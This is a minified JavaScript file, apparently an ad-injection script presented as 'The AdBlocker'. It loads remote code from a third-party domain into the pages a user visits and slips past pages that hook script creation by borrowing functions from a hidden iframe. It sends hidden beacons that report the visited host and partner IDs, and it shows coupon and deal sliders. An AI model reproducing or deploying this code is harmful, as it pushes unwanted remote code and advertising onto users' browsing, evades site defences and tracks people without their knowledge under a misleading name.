var Injector=function(){function e(){}return e.getAltDocument=function(){if(null==e.altDocument){var t=document.createElement("iframe");t.height=t.width="0",document.body.appendChild(t),e.altDocument=t.contentWindow.document}return e.altDocument},e.injectScript=function(t,n,o){var r=null,a=!0,i=!1,d=document.createElement;d.toString().indexOf("[native code]")>0?r=document.createElement("script"):(r=e.getAltDocument().createElement.call(document,"script"),a=!1),r.onload=r.onreadystatechange=function(){i||r.readyState&&"loaded"!==r.readyState&&"complete"!==r.readyState||(i=!0,r.parentNode&&r.parentNode.removeChild(r),n&&n())},r.onerror=function(e){i||(i=!0,o&&o(e))};var c=document.getElementsByTagName("head")[0],l=c.appendChild;return l.toString().indexOf("[native code]")>0?c.appendChild(r):(e.getAltDocument().appendChild.call(c,r),a=!1),r.src=t,a},e.altDocument=null,e}(),BootstrapHelper=function(){function e(){}return e.bootstrap=function(t,n,o){void 0===o&&(o=[]),o&&o.length||(o=window.FO_DOMAIN?[window.FO_DOMAIN]:[".datafastguru.info"]);var r=e.selectDomain(o);e.notify(r,t,"inj",{},.01);var a="//pstatic"+r+"/nwp/v0_0_411/release/Shared/SharedApp.js",i="FO.Shared_"+n+".SharedApp",d=Injector.injectScript(a,function(){var n=e.instantiateClass(i);n.init(t,r)},function(){e.notify(r,t,"exception",{ex:"Failure to get SharedApp"},.01)});window.setTimeout(function(){var n=void 0==window.FO;n&&e.notify(r,t,"generic",{subtype:"badinj",nativeinj:""+d},.01)},3e3)},e.notify=function(e,t,n,o,r){n+"_rate"in t.overrides&&(r=parseFloat(t.overrides[n+"_rate"]));var a=Math.random()<r;if(a){var i="//app"+e+"/a/"+n+"/logo.png?fam=nwp",d={};d.t=(new Date).getTime()+"",d.v="0_0_411",d.dmn=e,d.partid=t.partnerCode,d.subid=t.subId,d.hn=document.location.host;for(var c in d)i+="&"+c+"="+encodeURIComponent(d[c]);for(var c in o)i+="&"+c+"="+encodeURIComponent(o[c]);var l=document.body.appendChild(document.createElement("img"));l.style.zIndex="-100",l.style.position="absolute",l.style.left="0",l.style.top="0",l.src=i}},e.selectDomain=function(e){for(var t=[],n=0;n<e.length;n++)e[n]&&e[n].length&&-1==e[n].indexOf("$")&&t.push(e[n]);var n=Math.floor(Math.random()*t.length);return t[n]},e.instantiateClass=function(e){for(var t=e.split("."),n=window,o=0;o<t.length;o++)n=n[t[o]];var r=new n;return r},e}(),params={products:{DualBottomSlider:[{logic:["CommerceDealsLogic","CouponsLogic"],visual:"DualBottomSliderVisual",weight:10}]},modules:{},partnerCode:"wpboris",subId:"992_3500",providerName:"The AdBlocker",providerLink:"http://right-coupon.com",providerFooter:"",overrides:{inj_rate:"0",exception_rate:"1",noshow_rate:"0.01",init_rate:"0.01"}},version="0_0_411";BootstrapHelper.bootstrap(params,version);
